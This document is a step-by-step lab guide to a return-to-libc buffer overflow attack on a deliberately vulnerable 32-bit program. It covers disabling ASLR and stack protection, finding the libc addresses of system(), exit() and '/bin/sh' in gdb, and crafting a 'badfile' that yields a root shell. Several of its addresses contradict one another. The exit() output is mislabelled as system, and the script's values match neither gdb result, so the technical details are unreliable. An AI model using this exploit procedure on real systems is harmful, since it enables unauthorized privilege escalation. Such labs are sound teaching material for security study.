# Return-to-libc Attack Guide

## 📌 Step 1: Disable ASLR

ASLR (Address Space Layout Randomization) may affect the stability of the experiment. You can temporarily disable ASLR:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

This ensures that each time `stack` runs, the `libc` load address remains unchanged, making the return-to-libc attack more stable.

## 📌 Step 2: Compile `stack.c`

If your system is 64-bit, you may need to install 32-bit libraries:

```bash
sudo apt-get install gcc-multilib
```

Your `stack.c` code contains a typical buffer overflow vulnerability. First, stack protection needs to be disabled; otherwise, GCC will prevent buffer overflows by default:

```bash
gcc -m32 -fno-stack-protector -z execstack -o stack stack.c
```

### Explanation:

- `-m32` 👉 Compiles as 32-bit code (if your `libc` is 32-bit).
- `-fno-stack-protector` 👉 Disables canary protection.
- `-z execstack` 👉 Allows execution of code on the stack (for shellcode).
- `-o stack` 👉 Generates an executable file named `stack`.

## 📌 Step 3: Run `stack` and Check for Vulnerability

First, run `stack` to ensure it reads `badfile` correctly:

```bash
./stack
```

Since `badfile` has not been created yet, `stack` may output:

```bash
Segmentation fault (core dumped)
```

However, once `badfile` contains a malicious payload, it may hijack the return address and execute `system("/bin/sh")`, gaining a shell.

## 📌 Step 4: Determine `system()` Address

To execute return-to-libc, you need to find the `system()` function address using `gdb`:

```bash
gdb stack
```

Inside `gdb`, run:

```bash
(gdb) b foo
(gdb) r
```

Then check the address of `system()`:

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e42da0 <system>
```

Record this address (e.g., `0xf7e42da0`) as it will be used to craft the attack payload.

Then check the address of `exit()`:

```bash
(gdb) p exit
$1 = {<text variable, no debug info>} 0xb7e369d0 <system>
```

You can also locate the address of `"/bin/sh"` in `libc`:

```bash
(gdb) find 0xf7e00000, 0xf7ffffff, "/bin/sh"
```

It may output:

```bash
0xf7f4d890
```

Remember the `"/bin/sh"` address.

## 📌 Step 5: Generate `badfile`

The `libc_exploit.py` script is used to craft the attack input. Its core logic is:

```python
sh_addr = 0xbffffdd8     # Address of "/bin/sh"
exit_addr = 0xb7e369d0   # Address of exit()
system_addr = 0xb7e42da0 # Address of system()
```

Modify these values based on the `gdb` output, then run:

```bash
python3 libc_exploit.py
```

This script generates `badfile`, which contains carefully crafted buffer overflow data to hijack the return address and execute:

```c
system("/bin/sh");
```

## 📌 Step 6: Execute `stack`

Run:

```bash
./stack
```

If `badfile` is generated correctly, the program will execute `system("/bin/sh")`, granting you a root shell:

```ini
# id
uid=0(root) gid=0(root) groups=0(root)
```

## 📌 Step 7: Verify the Attack

If `stack` crashes:

- Ensure ASLR is disabled (`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`).
- Verify `system()` and `"/bin/sh"` addresses are correct using `gdb`.
- Make sure the addresses in `libc_exploit.py` match the `gdb` output.
- When running `stack`, check if `badfile` is correctly formatted:

```bash
hexdump -C badfile
```

Ensure that `system()` and `"/bin/sh"` addresses are at the correct positions.

---

**Done! 🎯 You have successfully executed a return-to-libc attack!**
